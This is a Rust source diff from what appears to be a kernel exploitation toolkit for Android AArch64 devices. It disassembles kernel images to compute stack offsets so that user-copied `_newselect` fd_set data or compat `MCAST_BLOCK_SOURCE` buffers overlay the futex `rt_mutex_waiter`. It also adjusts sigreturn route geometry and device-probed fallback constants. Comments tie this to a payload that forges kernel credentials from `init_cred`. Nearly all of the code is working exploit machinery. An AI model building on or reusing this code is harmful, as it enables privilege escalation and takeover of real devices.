+/// The carrier's bitmap geometry, mirroring the app's packer: three 40-byte
+/// user sets at nfds 320, six kernel sets of the same size, the 5.x strip.
+pub const COMPAT_BITMAP_BYTES: u64 = 0x78;
+pub const COMPAT_SET_BYTES: u64 = 40;
+const COMPAT_TIME32_WORDS: u64 = 9;
+const COMPAT_TIME32_HOME: u64 = 0x1b0;
+const COMPAT_TIME64_HOME: u64 = 0x1c0;
+
+/// Pure coverage check: given the derived strip home and buffer depth, does
+/// the compat `_newselect` copy carry the stamp? The home selects the ABI the
+/// helper would call; the kernel's `res_*` zeroing covers the time32 stamp's
+/// last two words at depths `[dst-6set, dst-3set]`, the time64 stamp is
+/// user-copied whole.
+pub fn compat_carrier_coverage(home: u64, dst: u64) -> Option<(&'static str, u64)> {
+    if dst < home {
+        return None;
+    }
+    let offset = dst - home;
+    match home {
+        COMPAT_TIME32_HOME if offset + COMPAT_TIME32_WORDS * 8 <= COMPAT_BITMAP_BYTES => {
+            let tail_deepest = home as i64 - 0x48;
+            let tail_shallowest = home as i64 - 0x57;
+            let zero_deepest = dst as i64 - 6 * COMPAT_SET_BYTES as i64;
+            let zero_shallowest = dst as i64 - 3 * COMPAT_SET_BYTES as i64;
+            (tail_deepest <= zero_shallowest && tail_shallowest >= zero_deepest)
+                .then_some(("futex_time32", offset))
+        }
+        COMPAT_TIME64_HOME if offset + WAITER_STRIP_BYTES <= COMPAT_BITMAP_BYTES => {
+            Some(("futex_time64", offset))
+        }
+        _ => None,
+    }
+}
+
+/// Derive the compat carrier's geometry from the image:
+/// `__arm64_compat_sys_select -> do_compat_select -> compat_core_sys_select`
+/// gives the `_newselect` buffer depth; the 32-bit futex entries give the two
+/// candidate strip homes (`futex_time32`, and `futex_time64` reusing the
+/// 64-bit wrapper). The image's waiter must be the 5.x flat strip the
+/// carrier's stamp encodes (no `wake_state`).
+pub fn derive_compat_carrier_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: Option<&Btf>,
+    kernel_major: Option<u32>,
+) -> Result<CompatCarrierLayout> {
+    let waiter = match btf {
+        Some(btf) => WaiterLayout::from_btf(btf)?,
+        None if kernel_major == Some(5) => crate::family::waiter_layout_5_10(),
+        None => {
+            return Err(ExtractError::new(
+                "compat carrier: no BTF and the no-BTF waiter template is 5.10-only",
+            ))
+        }
+    };
+    if waiter.wake_state.is_some() {
+        return Err(ExtractError::new(
+            "compat carrier: the image's waiter has a wake_state field; the carrier's \
+             stamp is the 5.x flat strip",
+        ));
+    }
+    let pi_tree = waiter.pi_tree_entry;
+
+    /* The compat `_newselect` chain and its fd_set buffer. Same shape as the
+     * 64-bit core_sys_select derivation: the buffer is the `add x, sp, #imm`
+     * immediate that is compared against a peer register, and the threshold
+     * proves nfds=320 stays on the 256-byte stack path. */
+    let mut select_dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+    for (key, name) in [
+        ("wrapper", "__arm64_compat_sys_select"),
+        ("dispatch", "do_compat_select"),
+        ("core", "compat_core_sys_select"),
+    ] {
+        select_dis.insert(
+            key,
+            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
+        );
+    }
+    let core_addr = unique_offset(symbols, "compat_core_sys_select")?;
+    let dispatch_addr = unique_offset(symbols, "do_compat_select")?;
+    if !has_direct_call(&select_dis["wrapper"], dispatch_addr) {
+        return Err(ExtractError::new(
+            "__arm64_compat_sys_select does not directly call do_compat_select",
+        ));
+    }
+    if !has_direct_call(&select_dis["dispatch"], core_addr) {
+        return Err(ExtractError::new(
+            "do_compat_select does not directly call compat_core_sys_select",
+        ));
+    }
+    validate_frame_live_at(
+        &select_dis["wrapper"],
+        &Regex::new(&format!(r"(?i)\bbl\s+0x{dispatch_addr:x}\b")).unwrap(),
+        "__arm64_compat_sys_select",
+    )?;
+    validate_frame_live_at(
+        &select_dis["dispatch"],
+        &Regex::new(&format!(r"(?i)\bbl\s+0x{core_addr:x}\b")).unwrap(),
+        "do_compat_select",
+    )?;
+    let wrapper_frame = first_sp_frame(&select_dis["wrapper"], "__arm64_compat_sys_select")?;
+    let dispatch_frame = first_sp_frame(&select_dis["dispatch"], "do_compat_select")?;
+    let core_frame = first_sp_frame(&select_dis["core"], "compat_core_sys_select")?;
+    let select_frames = wrapper_frame
+        .checked_add(dispatch_frame)
+        .and_then(|sum| sum.checked_add(core_frame))
+        .ok_or_else(|| ExtractError::new("compat select chain overflow"))?;
+
+    let add_sp = add_sp_immediates(&select_dis["core"]);
+    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
+    for (reg, imm) in &add_sp {
+        let peers: Vec<&str> = add_sp
+            .iter()
+            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
+            .map(|(peer, _)| peer.as_str())
+            .collect();
+        let any_cmp = peers.iter().any(|peer| {
+            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
+            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
+            select_dis["core"]
+                .iter()
+                .any(|line| re.is_match(line) || re2.is_match(line))
+        });
+        if any_cmp {
+            buffer_candidates.insert(*imm);
+        }
+    }
+    if buffer_candidates.len() != 1 {
+        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
+        return Err(ExtractError::new(format!(
+            "compat_core_sys_select fd_set buffer candidates not unique: {hex:?}"
+        )));
+    }
+    let buffer = *buffer_candidates.iter().next().unwrap();
+    let fds_bytes = ((PSELECT_ROUTE_NFDS + 63) / 64) * 8;
+    let thresholds = cmp_immediates_any_width(&select_dis["core"]);
+    if !thresholds
+        .iter()
+        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
+    {
+        return Err(ExtractError::new(format!(
+            "compat_core_sys_select threshold does not prove nfds={PSELECT_ROUTE_NFDS} \
+             uses the stack fd_set path"
+        )));
+    }
+    let select_dst_depth = select_frames
+        .checked_sub(buffer)
+        .ok_or_else(|| ExtractError::new("compat select buffer exceeds its frames"))?;
+
+    /* The two candidate strip homes from the image's own futex entries. */
+    let wait_name = "futex_wait_requeue_pi";
+    let wait_dis = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let waiter_local = waiter_local_from_dis(&wait_dis, pi_tree)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    let time32_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex_time32",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+    let time64_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+
+    let mut refused = Vec::new();
+    for (home, entry) in [
+        (time32_home, "futex_time32"),
+        (time64_home, "futex_time64"),
+    ] {
+        if let Some((abi, offset)) = compat_carrier_coverage(home, select_dst_depth) {
+            return Ok(CompatCarrierLayout {
+                waiter_home: home,
+                select_dst_depth,
+                offset,
+                abi,
+            });
+        }
+        refused.push(format!(
+            "{entry} home 0x{home:x} vs _newselect dst 0x{select_dst_depth:x} does not fit"
+        ));
+    }
+    Err(ExtractError::new(format!(
+        "compat carrier: {}",
+        refused.join("; ")
+    )))
+}
+
+/// The AArch32 compat `MCAST_BLOCK_SOURCE` carrier's per-image geometry.
+///
+/// The option's 64-bit path copies the `group_source_req` to a fixed stack
+/// local. A `CONFIG_COMPAT` build carries a second, `is_compat_task()`-gated
+/// copy of the 32-bit struct to a *different* local; that local is the one
+/// that can land on the futex waiter. Both copies are required here: the
+/// larger one proves the case, the smaller one is the carrier.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct CompatMulticastLayout {
+    /// The compat copy destination's depth below the setsockopt entry sp.
+    pub copy_depth: u64,
+    /// The futex waiter strip home for the chosen ABI.
+    pub waiter_home: u64,
+    /// `copy_depth - waiter_home`: where the eleven-word strip is packed.
+    pub waiter_off: u64,
+    /// The compat struct size, from the image's own copy immediate.
+    pub buffer_size: u64,
+    /// `futex_time32` or `futex_time64`.
+    pub abi: &'static str,
+    /// 0 = time32 (240), 1 = time64 (422); the wire value.
+    pub futex_abi: u8,
+    /// Whether the strip overlaps the source sockaddr header in the struct.
+    pub source_overlap: bool,
+}
+
+impl CompatMulticastLayout {
+    /// The compat `group_source_req` is a `u32 gsr_interface` followed by the
+    /// group and source `sockaddr_storage`s (128 bytes each), so `gsr_source`
+    /// starts at `buffer_size - 128`.
+    pub fn source_offset(&self) -> u64 {
+        self.buffer_size.saturating_sub(128)
+    }
+}
+
+/// The first stack copy in the block that starts at `start`. The copy helper's
+/// fourth argument (the size) is `w3`; the preceding `memset` uses `w2`, so
+/// tracking only `mov w3, #size` separates the two calls without resolving
+/// the callee (the kernel can carry more than one `copy_from_sockptr`
+/// instance, so its symbol is not a reliable anchor).
+fn copy_in_block(lines: &[String], start: usize) -> Option<(u64, u64)> {
+    let add = Regex::new(r"(?i)^x0,\s*sp,\s*#0x([0-9a-f]+)$").unwrap();
+    let size = Regex::new(r"(?i)^w3,\s*#0x([0-9a-f]+)$").unwrap();
+    let end = (start + 24).min(lines.len());
+    let mut local = None;
+    let mut size_value = None;
+    for line in &lines[start..end] {
+        let (mnemonic, operands) = split_line(line);
+        let mnemonic = mnemonic.to_ascii_lowercase();
+        if mnemonic == "add" {
+            if let Some(caps) = add.captures(&operands) {
+                local = u64::from_str_radix(&caps[1], 16).ok();
+            }
+        } else if mnemonic == "mov" {
+            if operands.eq_ignore_ascii_case("x0, sp") {
+                local = Some(0);
+            } else if let Some(caps) = size.captures(&operands) {
+                size_value = u64::from_str_radix(&caps[1], 16).ok();
+            }
+        } else if mnemonic == "bl" {
+            if let (Some(local), Some(size_value)) = (local, size_value) {
+                return Some((local, size_value));
+            }
+        } else if mnemonic == "b" || mnemonic == "ret" {
+            break;
+        }
+    }
+    None
+}
+
+/// Every `copy_from_sockptr`-shaped call in the function that writes a stack
+/// local, as (local offset, size immediate). The nearest preceding
+/// `add x0, sp` and `mov w3, #size` are the call's arguments; a `memset` with
+/// the same size uses `w2` and is not collected.
+fn copy_sites(lines: &[String]) -> Vec<(u64, u64)> {
+    let add = Regex::new(r"(?i)^x0,\s*sp,\s*#0x([0-9a-f]+)$").unwrap();
+    let size = Regex::new(r"(?i)^w3,\s*#0x([0-9a-f]+)$").unwrap();
+    let mut out = Vec::new();
+    for (index, line) in lines.iter().enumerate() {
+        let (mnemonic, _) = split_line(line);
+        if !mnemonic.eq_ignore_ascii_case("bl") {
+            continue;
+        }
+        let lo = index.saturating_sub(12);
+        let mut local = None;
+        let mut size_value = None;
+        for previous in lines[lo..index].iter().rev() {
+            let (mnemonic, operands) = split_line(previous);
+            let mnemonic = mnemonic.to_ascii_lowercase();
+            if local.is_none() {
+                if mnemonic == "add" {
+                    if let Some(caps) = add.captures(&operands) {
+                        local = u64::from_str_radix(&caps[1], 16).ok();
+                    }
+                } else if mnemonic == "mov" && operands.eq_ignore_ascii_case("x0, sp") {
+                    local = Some(0);
+                }
+            }
+            if size_value.is_none() && mnemonic == "mov" {
+                if let Some(caps) = size.captures(&operands) {
+                    size_value = u64::from_str_radix(&caps[1], 16).ok();
+                }
+            }
+            if local.is_some() && size_value.is_some() {
+                break;
+            }
+        }
+        if let (Some(local), Some(size_value)) = (local, size_value) {
+            out.push((local, size_value));
+        }
+    }
+    out.sort_unstable();
+    out.dedup();
+    out
+}
+
+/// Find the `MCAST_BLOCK_SOURCE` case's two copies in the setsockopt handler.
+///
+/// The compat copy is found from the handler's own `TIF_32BIT` branch
+/// (`tbnz w8, #0x16`): the branch target is the compat block, which copies the
+/// 32-bit struct from the user pointer to a stack local. The 64-bit sibling is
+/// any other `copy_from_sockptr` stack copy of a larger struct in the same
+/// function (BTF names its size when it is present). Both being present is the
+/// evidence that the case is the group-request option; a missing, ambiguous or
+/// overlaid site is an error, never a guess.
+fn compat_multicast_copies(
+    lines: &[String],
+    function_addr: u64,
+    sibling_size: Option<u64>,
+) -> std::result::Result<(u64, u64), String> {
+    let tif = Regex::new(r"(?i)\btbnz\s+w8,\s*#0x16,\s*0x([0-9a-f]+)\b").unwrap();
+    let mut compat: BTreeSet<(u64, u64)> = BTreeSet::new();
+    for line in lines {
+        let Some(caps) = tif.captures(line) else { continue };
+        let Ok(target) = u64::from_str_radix(&caps[1], 16) else { continue };
+        let Some(relative) = target.checked_sub(function_addr) else { continue };
+        if relative % 4 != 0 {
+            continue;
+        }
+        let start = (relative / 4) as usize;
+        if start >= lines.len() {
+            continue;
+        }
+        if let Some(copy) = copy_in_block(lines, start) {
+            compat.insert(copy);
+        }
+    }
+    if compat.len() != 1 {
+        let sites: Vec<String> = compat
+            .iter()
+            .map(|(local, size)| format!("sp+0x{local:x}/0x{size:x}"))
+            .collect();
+        return Err(format!(
+            "compat MCAST_BLOCK_SOURCE copy is not unique: {sites:?} from the TIF_32BIT branches"
+        ));
+    }
+    let (local, size) = *compat.iter().next().unwrap();
+    if size == 0 || local % 8 != 0 {
+        return Err(format!(
+            "compat MCAST_BLOCK_SOURCE copy is not usable: sp+0x{local:x}/0x{size:x}"
+        ));
+    }
+    let sites = copy_sites(lines);
+    let sibling = sites
+        .iter()
+        .filter(|(site, site_size)| *site != local && *site_size > size)
+        .filter(|(_, site_size)| sibling_size.map_or(true, |expected| expected == *site_size))
+        .map(|(_, site_size)| *site_size)
+        .collect::<BTreeSet<u64>>();
+    if sibling.len() != 1 {
+        let sizes: Vec<String> = sibling.iter().map(|size| format!("0x{size:x}")).collect();
+        return Err(format!(
+            "the 64-bit group_source_req sibling copy is not unique: {sizes:?} next to \
+             the compat copy sp+0x{local:x}/0x{size:x}"
+        ));
+    }
+    Ok((local, size))
+}
+
+/// Derive the AArch32 compat `MCAST_BLOCK_SOURCE` carrier's geometry from the
+/// image. The 64-bit path's copy is the sibling; the compat branch's copy is
+/// the carrier. The waiter must be the compact eleven-word strip (the route's
+/// stamp), and both futex homes are derived per image because a build may
+/// inline `do_futex` into the 64-bit wrapper.
+pub fn derive_compat_multicast_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: Option<&Btf>,
+    kernel_major: Option<u32>,
+) -> Result<CompatMulticastLayout> {
+    let waiter = match btf {
+        Some(btf) => WaiterLayout::from_btf(btf)?,
+        None if kernel_major == Some(5) => crate::family::waiter_layout_5_10(),
+        None => {
+            return Err(ExtractError::new(
+                "compat multicast: no BTF and the no-BTF waiter template is 5.10-only",
+            ))
+        }
+    };
+    let compact = match btf {
+        Some(btf) => crate::layout::waiter_is_compact(btf),
+        None => Some(true),
+    };
+    if compact != Some(true) {
+        return Err(ExtractError::new(
+            "compat multicast: the waiter is not the compact eleven-word strip",
+        ));
+    }
+    let lock_offset = waiter
+        .lock
+        .ok_or_else(|| ExtractError::new("compat multicast: rt_mutex_waiter.lock missing"))?;
+
+    /* 6.x splits the option handlers out of ip_setsockopt; 5.x keeps them in. */
+    let copy_fn = if unique_offset_optional(symbols, "do_ip_setsockopt").is_some() {
+        "do_ip_setsockopt"
+    } else if unique_offset_optional(symbols, "ip_setsockopt").is_some() {
+        "ip_setsockopt"
+    } else {
+        return Err(ExtractError::new(
+            "compat multicast: neither do_ip_setsockopt nor ip_setsockopt is present",
+        ));
+    };
+    let copy_fn_addr = unique_offset(symbols, copy_fn)?;
+    let lines = disassemble_symbol(kernel, symbols, sorted_offsets, copy_fn, OBJDUMP_CAP)?;
+
+    let sibling_size = btf
+        .and_then(|btf| btf.size("group_source_req"))
+        .map(u64::from);
+    let (compat_local, compat_size) =
+        compat_multicast_copies(&lines, copy_fn_addr, sibling_size).map_err(ExtractError::new)?;
+
+    /* The setsockopt chain. The wrapper's link to __sys_setsockopt is proven
+     * per image; the middle links are the indirect CFI dispatchers
+     * (sock_common_setsockopt -> udp_setsockopt -> ip_setsockopt), named
+     * rather than walked. */
+    let wrapper_name = "__arm64_sys_setsockopt";
+    let wrapper = disassemble_symbol(kernel, symbols, sorted_offsets, wrapper_name, OBJDUMP_CAP)?;
+    let sys_name = "__sys_setsockopt";
+    let sys_addr = unique_offset(symbols, sys_name)?;
+    if !has_direct_call(&wrapper, sys_addr) {
+        return Err(ExtractError::new(
+            "__arm64_sys_setsockopt does not directly call __sys_setsockopt",
+        ));
+    }
+    let mut chain: Vec<&str> = vec![
+        wrapper_name,
+        sys_name,
+        "sock_common_setsockopt",
+        "udp_setsockopt",
+        "ip_setsockopt",
+    ];
+    if copy_fn == "do_ip_setsockopt" {
+        chain.push("do_ip_setsockopt");
+    }
+    let chain_sum = sum_chain_frames(kernel, symbols, sorted_offsets, &chain)?;
+    let copy_depth = chain_sum.checked_sub(compat_local).ok_or_else(|| {
+        ExtractError::new(format!(
+            "compat multicast: the copy local sp+0x{compat_local:x} exceeds the chain sum \
+             0x{chain_sum:x}"
+        ))
+    })?;
+
+    let wait_name = "futex_wait_requeue_pi";
+    let wait_dis = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let waiter_local = waiter_local_from_dis(&wait_dis, waiter.pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("compat multicast: futex waiter local not found"))?;
+    let time32_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex_time32",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+    let time64_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+
+    let mut candidates: Vec<(bool, u64, CompatMulticastLayout)> = Vec::new();
+    for (abi, futex_abi, home) in [
+        ("futex_time64", 1u8, time64_home),
+        ("futex_time32", 0u8, time32_home),
+    ] {
+        let Some(off) = copy_depth.checked_sub(home) else { continue };
+        if off == 0 || off % 8 != 0 {
+            continue;
+        }
+        if off + lock_offset + 8 > compat_size || off + WAITER_STRIP_BYTES > compat_size {
+            continue;
+        }
+        let source_offset = compat_size.saturating_sub(128);
+        let overlap = off < source_offset + 8 && off + WAITER_STRIP_BYTES > source_offset;
+        let margin = compat_size - (off + WAITER_STRIP_BYTES);
+        candidates.push((
+            overlap,
+            margin,
+            CompatMulticastLayout {
+                copy_depth,
+                waiter_home: home,
+                waiter_off: off,
+                buffer_size: compat_size,
+                abi,
+                futex_abi,
+                source_overlap: overlap,
+            },
+        ));
+    }
+    /* Prefer a placement that leaves the kernel-read sockaddr header alone,
+     * then the larger remaining margin, then the time64 entry. */
+    candidates.sort_by(|a, b| {
+        a.0.cmp(&b.0)
+            .then_with(|| b.1.cmp(&a.1))
+            .then_with(|| b.2.futex_abi.cmp(&a.2.futex_abi))
+    });
+    candidates
+        .into_iter()
+        .next()
+        .map(|(_, _, layout)| layout)
+        .ok_or_else(|| {
+            ExtractError::infeasible_with(
+                format!(
+                    "compat multicast: the compat copy depth 0x{copy_depth:x} cannot cover \
+                     the waiter strip (time32 home 0x{time32_home:x}, time64 home \
+                     0x{time64_home:x}, buffer 0x{compat_size:x}, lock 0x{lock_offset:x})"
+                ),
+                [
+                    ("copy_depth", copy_depth as i64),
+                    ("time32_home", time32_home as i64),
+                    ("time64_home", time64_home as i64),
+                    ("buffer_size", compat_size as i64),
+                    ("lock_offset", lock_offset as i64),
+                ]
+                .into_iter()
+                .map(|(key, value)| (key.to_string(), value))
+                .collect::<BTreeMap<String, i64>>(),
+            )
+        })
 }
 
 /// Derive the sigreturn route's per-image geometry:
@@ -1218,38 +2114,58 @@ pub fn derive_sigreturn_layout(
     pi_tree_entry: u64,
 ) -> Result<SigreturnLayout> {
     let rt_name = "__arm64_sys_rt_sigreturn";
-    let rs_name = "restore_sigframe";
-    let plain_name = "restore_fpsimd_context";
-    let sve_name = "restore_sve_fpsimd_context";
     let rt = disassemble_symbol(kernel, symbols, sorted_offsets, rt_name, OBJDUMP_CAP)?;
-    let rs = disassemble_symbol(kernel, symbols, sorted_offsets, rs_name, OBJDUMP_CAP)?;
-    let plain = disassemble_symbol(kernel, symbols, sorted_offsets, plain_name, OBJDUMP_CAP)?;
-    let sve = disassemble_symbol(kernel, symbols, sorted_offsets, sve_name, OBJDUMP_CAP)?;
-    let rt_rs = unique_offset(symbols, rs_name)?;
-    let rs_plain = unique_offset(symbols, plain_name)?;
-    let rs_sve = unique_offset(symbols, sve_name)?;
-    for (lines, target, caller) in [
-        (&rt, rt_rs, rt_name),
-        (&rs, rs_plain, rs_name),
-        (&rs, rs_sve, rs_name),
-    ] {
-        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
-        validate_frame_live_at(lines, &anchor, caller)?;
-    }
     let rt_frame = first_sp_frame(&rt, rt_name)?;
-    let rs_frame = first_sp_frame(&rs, rs_name)?;
-    let plain_frame = first_sp_frame(&plain, plain_name)?;
-    let sve_frame = first_sp_frame(&sve, sve_name)?;
-    let chain_plain = rt_frame
-        .checked_add(rs_frame)
-        .and_then(|value| value.checked_add(plain_frame))
-        .ok_or_else(|| ExtractError::new("sigreturn plain chain overflow"))?;
-    let chain_sve = rt_frame
-        .checked_add(rs_frame)
-        .and_then(|value| value.checked_add(sve_frame))
-        .ok_or_else(|| ExtractError::new("sigreturn SVE chain overflow"))?;
-    let dst_plain = fpsimd_copy_destination(&plain, SIGRETURN_COPY_BYTES)?;
-    let dst_sve = fpsimd_copy_destination(&sve, SIGRETURN_COPY_BYTES)?;
+    /* The out-of-line helper shape (5.10) is preferred: its frames are separate
+     * and its calls are validated. A build that inlines the helpers (6.1:
+     * restore_sigframe and both restore_*_fpsimd_context are absent) carries
+     * the same two 0x200-byte vregs copies in the handler's own frame. */
+    let helpers_present = [
+        "restore_sigframe",
+        "restore_fpsimd_context",
+        "restore_sve_fpsimd_context",
+    ]
+    .iter()
+    .all(|name| unique_offset_optional(symbols, name).is_some());
+    let (chain_plain, chain_sve, dst_plain, dst_sve) = if helpers_present {
+        let rs_name = "restore_sigframe";
+        let plain_name = "restore_fpsimd_context";
+        let sve_name = "restore_sve_fpsimd_context";
+        let rs = disassemble_symbol(kernel, symbols, sorted_offsets, rs_name, OBJDUMP_CAP)?;
+        let plain = disassemble_symbol(kernel, symbols, sorted_offsets, plain_name, OBJDUMP_CAP)?;
+        let sve = disassemble_symbol(kernel, symbols, sorted_offsets, sve_name, OBJDUMP_CAP)?;
+        let rt_rs = unique_offset(symbols, rs_name)?;
+        let rs_plain = unique_offset(symbols, plain_name)?;
+        let rs_sve = unique_offset(symbols, sve_name)?;
+        for (lines, target, caller) in [
+            (&rt, rt_rs, rt_name),
+            (&rs, rs_plain, rs_name),
+            (&rs, rs_sve, rs_name),
+        ] {
+            let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
+            validate_frame_live_at(lines, &anchor, caller)?;
+        }
+        let rs_frame = first_sp_frame(&rs, rs_name)?;
+        let plain_frame = first_sp_frame(&plain, plain_name)?;
+        let sve_frame = first_sp_frame(&sve, sve_name)?;
+        let chain_plain = rt_frame
+            .checked_add(rs_frame)
+            .and_then(|value| value.checked_add(plain_frame))
+            .ok_or_else(|| ExtractError::new("sigreturn plain chain overflow"))?;
+        let chain_sve = rt_frame
+            .checked_add(rs_frame)
+            .and_then(|value| value.checked_add(sve_frame))
+            .ok_or_else(|| ExtractError::new("sigreturn SVE chain overflow"))?;
+        let dst_plain = fpsimd_copy_destination(&plain, SIGRETURN_COPY_BYTES)?;
+        let dst_sve = fpsimd_copy_destination(&sve, SIGRETURN_COPY_BYTES)?;
+        (chain_plain, chain_sve, dst_plain, dst_sve)
+    } else {
+        /* Inlined: both copies live in the handler's own frame; the
+         * destination must be unique (plain and SVE share it on the sampled
+         * 6.1 builds). A split-local build fails closed. */
+        let dst = fpsimd_copy_destination(&rt, SIGRETURN_COPY_BYTES)?;
+        (rt_frame, rt_frame, dst, dst)
+    };
     let copy_dst_plain = chain_plain
         .checked_sub(dst_plain)
         .ok_or_else(|| ExtractError::new("plain fpsimd copy destination exceeds the chain sum"))?;
@@ -1518,10 +2434,21 @@ pub fn derive_nf_logger_registration(
 /// a route constant, not the image's `usage` value.
 pub const CRED_5X_USAGE_VALUE: u64 = 256;
 
-/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
-/// UDP `MCAST_BLOCK_SOURCE` probe.
-pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
-pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;
+/// The multicast `waiter_off` measured on the A301SO hardware probe (IPv4 UDP
+/// `MCAST_BLOCK_SOURCE`). The extractor prefers the per-image derivation; this
+/// value is the labelled fallback for a feasible verdict whose numbers are
+/// incomplete, never a substitute for the derivation.
+pub const MULTICAST_PROBED_WAITER_OFF: i64 = 96;
+
+/// `sizeof(struct group_source_req)`: the setsockopt handler zeroes and copies
+/// exactly this UAPI buffer. A BTF-less image has no other source for the copy
+/// length, so the verdict records this ABI constant as the labelled fallback
+/// (`buffer_source = 1`). It is not a kernel-version fact.
+pub const GROUP_SOURCE_REQ_SIZE: i64 = 264;
+
+/// The multicast route's stamp is the flat (compact) waiter strip: the flag
+/// selects the native route implementation's encoder, not a kernel fact.
+pub const MULTICAST_COMPACT_WAITER: i64 = 1;
 
 /// Fields read from the real `init_cred`; the payload builder fills a private
 /// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
@@ -1662,28 +2589,29 @@ pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cr
     })
 }
 
-/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
-/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
-/// offsets, and the compact-waiter flag. These hold across devices on the same
-/// train. A missing BTF value omits that key so the built-in profile can
-/// supply it.
+/// The train-corroborated multicast geometry: `waiter_off` from the hardware
+/// probe, the UAPI copy length, the `rt_mutex_waiter` field offsets, and the
+/// compact-waiter flag. This is a **fallback only**: the route block is built
+/// from the route verdict's image-derived numbers, and these values fill a key
+/// that a feasible verdict could not produce. A missing BTF value omits that
+/// key so the built-in profile can supply it.
 pub fn multicast_geometry_corroborated(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
     let mut geometry: Vec<(&'static str, i64)> = vec![
-        ("waiter_off", MULTICAST_5X_WAITER_OFF),
-        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
+        ("waiter_off", MULTICAST_PROBED_WAITER_OFF),
+        ("buffer_size", GROUP_SOURCE_REQ_SIZE),
     ];
     geometry.extend(multicast_waiter_field_offsets(structs));
-    geometry.push(("compact_waiter", 1));
+    geometry.push(("compact_waiter", MULTICAST_COMPACT_WAITER));
     geometry
 }
 
 fn multicast_waiter_field_offsets(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
-    // Without BTF (every 5.10 image) the waiter layout is the 5.10 codegen
-    // one: task 0x30, lock 0x38. The caller only emits 5.x geometry here.
+    // A BTF image supplies the offsets; without BTF the only template the
+    // extractor carries is the 5.10 codegen layout (task 0x30, lock 0x38).
     let fallback = crate::family::waiter_layout_5_10();
     let mut geometry: Vec<(&'static str, i64)> = Vec::new();
     if let Some(task) = structs
@@ -1705,17 +2633,10 @@ fn multicast_waiter_field_offsets(
     geometry
 }
 
-/// Full 5.x multicast geometry for the exact validated release. The forged
-/// object placement is no longer emitted (resident writer removed), so the
-/// geometry equals the train-corroborated set.
-pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
-    multicast_geometry_corroborated(structs)
-}
-
-/// BTF-only part of the 5.x multicast geometry for releases with no verified
+/// BTF-only part of the multicast geometry for releases with no verified
 /// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
-/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
-/// not mistaken for image-derived values.
+/// / `.lock`). The train fallback is omitted on purpose so it is not mistaken
+/// for an image-derived value.
 pub fn multicast_geometry_btf_only(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
